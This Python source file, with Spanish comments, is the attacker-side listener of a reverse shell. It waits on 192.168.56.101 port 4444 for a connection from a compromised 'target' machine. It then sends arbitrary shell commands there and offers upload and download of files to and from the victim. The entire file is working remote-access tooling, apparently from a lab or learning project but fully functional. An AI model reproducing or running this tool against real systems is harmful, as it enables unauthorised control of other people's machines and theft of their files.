#!/usr/bin/env python

import socket
from colorama import init, Fore
import json
import os


init()
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
RESET = Fore.RESET

class Listener():
    def __init__(self, ip, port):

        self.ip = ip
        self.port = port

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Se reutilizan los sockets libres
        listener.bind((self.ip, self.port))
        listener.listen(5)  # Número de conexiones que serán encoladas antes de empezar a rechazar nuevas

        print (f"{GREEN}[+] A la escucha...{RESET}")

        self.connection, self.address = listener.accept()

        print (f"{YELLOW}[+] Conexión establecida desde ", str(self.address), f'{RESET}')
    
    def sendData(self, data):
        
        # Se empaqueta el comando con el valor 'comm' en un diccionario

        self.data = {"comm": data}
        jsonData = json.dumps(self.data)
        self.connection.send(bytes(jsonData, encoding='utf-8'))

    def receiveData(self):

        # Función de recepción de datos

        jsonData = ""

        # Se irá cargando en un bucle los datos a medida que se reciban hasta poder imprimirlos al completo
    
        while True:
            try:
                jsonData = bytes(jsonData, encoding="utf-8") + self.connection.recv(1024)
                jsonData = jsonData.decode("utf-8")
        
                reslt = json.loads(jsonData)
                return reslt

            except ValueError:
                continue

    def upFile(self, filename):

        # Función de carga de ficheros
          
        self.filename = filename
        
        with open(self.filename, "r") as fileR:
            data = fileR.readlines()
        
        return data

    def dowFile(self, command):

        # Función de descarga de ficheros

        self.sendData(command)
        self.filename = command[9:]

        data = self.receiveData()
        
        # Se crea un fichero en local con el mismo nombre en caso de no existir o se añade el contenido si ya existía

        with open(self.filename, "a") as fileC:
            for i in data['result']:
                for j in i:
                    fileC.write(j)

    def transfer(self):

        # Shell

        try:

            # Descripción de comandos especiales

            print ("")
            print (f"{CYAN}OPCIONES ESPECIALES{RESET}".center(100), end="\n\n\n")
            print (f"{CYAN}CAMBIAR DIRECTORIO ACTUAL: {RESET}".center(100), "lcd [NUEVO DIRECTORIO LOCAL]")
            print (f"{CYAN}IMPRIMIR DIRECTORIO ACTUAL: {RESET}".center(100), "lpwd")
            print (f"{CYAN}SUBIR UN FICHERO A LA MÁQUINA DEL OBJETIVO: {RESET}".center(100), "upload [NOMBRE DEL FICHERO]")
            print (f"{CYAN}DESCARGAR UN FICHERO DESDE LA MÁQUINA DEL OBJETIVO: {RESET}".center(100), "download [NOMBRE DEL FICHERO]")
            print (f"{CYAN}LIMPIAR PANTALLA: {RESET}".center(100), "clear")
            print (f"{CYAN}SALIR: {RESET}".center(100), "exit")
            print ("")

            while True:
                self.command = input(f"{GREEN}>> {RESET}")

                if self.command[:3].lower() == "lcd":
                    newLocalDir = self.command[4:]
                    if os.path.exists(newLocalDir):
                        print (f"{YELLOW}[+] Se ha cambiado el directorio local a {newLocalDir}{RESET}")
                        os.chdir(newLocalDir)
                    else:
                        print(f"{RED}[+] El directorio local indicado no existe!{RESET}")

                elif self.command.lower() == "lpwd":
                    print (f"{YELLOW}[+] Directorio local actual: {RESET}{os.getcwd()}")

                # Funciones especiales

                elif self.command.lower() == "exit":
                    self.sendData(self.command)
                    exit()

                elif self.command.lower() == "clear":
                    os.system("clear")

                elif "upload" in self.command.lower():
       
                    self.filename = self.command[7:]

                    orgFile = os.path.join(os.getcwd(), self.filename)
                    
                    if os.path.exists(orgFile):
                        self.sendData(self.command)
                   
                        stat = self.receiveData()
                        
                        for i in stat['result']:
                            if "abierto" in i:
                                data = self.upFile(self.filename)
                                self.sendData(data)

                                confirmCr = self.receiveData()
                            
                                for i in confirmCr['result']:
                                    print (f"{YELLOW}[+] {i}{RESET}")

                    else:
                        print (f"{RED}[+] Fichero no encontrado en el directorio actual{RESET}")

                elif self.command[:8].lower() == "download":
                    self.dowFile(self.command)

                else:
                    self.sendData(self.command)
                    result = self.receiveData()

                    for i in result:
                        for j in result[i]:
                            if j != "Error con el comando":
                                if "cambiado" in j:
                                    print (f"\n{YELLOW}[+] {j}{RESET}\n")
                                else:
                                    print (j)
                            else:
                                print (f"{RED}{j}{RESET}")
            
        except:
        
            print (f"{RED}Cerrando conexión...{RESET}")
            self.sendData("Cerrando conexión")
            self.connection.close()
            exit()

listen = Listener('192.168.56.101', 4444)
listen.transfer()
